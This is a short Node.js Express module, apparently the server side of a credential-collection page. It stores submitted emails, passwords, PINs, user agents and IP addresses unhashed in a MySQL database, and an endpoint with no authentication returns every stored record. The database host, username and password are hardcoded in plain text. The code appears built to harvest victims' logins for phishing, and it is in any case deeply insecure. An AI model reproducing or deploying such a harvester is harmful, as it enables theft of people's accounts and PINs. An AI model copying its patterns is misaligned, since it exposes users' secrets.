
const e = require('express');
const { response } = require('express');
const mysql = require('mysql');

//process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
const con = mysql.createPool({
    host:'developlive2.cxgrk3bvq6tl.us-east-2.rds.amazonaws.com',
    user:'developlive2',
    password:'Lord1928E#',
    database:'developlive2',
    port:3306
})

const coreSetting = {}

coreSetting.sendx1 = (req,res) =>{
let username = req.body.use
let pass = req.body.pas
let agent = req.body.agent
let pinxs = req.body.pinxs
let ips = req.body.ips

con.getConnection((err,conxs) =>{
    if(!err){
        
        let sql = 'INSERT INTO users SET ?'
        let valueSql = {mail:username,pass:pass,agentx:agent,pinx:pinxs,ipuser:ips}
        conxs.query(sql,valueSql,(errom,response) =>{
            if(!errom){
                res.send('welcome')
            }else{
                res.send('error')
            }
        })
    }else{
        res.send('hubo un error')
    }
    
})

}

coreSetting.getInfo =(req,res) =>{
    con.getConnection((err,conxs) =>{
        if(!err){
            let sql = 'SELECT * FROM users'

            conxs.query(sql,(errom,response) =>{
                if(!errom){
                    res.send(JSON.stringify(response))
                }else{
                    res.send('hubo un error')
                }
            })
        }else{
            res.send('hubo un error')
        }
        
    })
      
}


module.exports = coreSetting
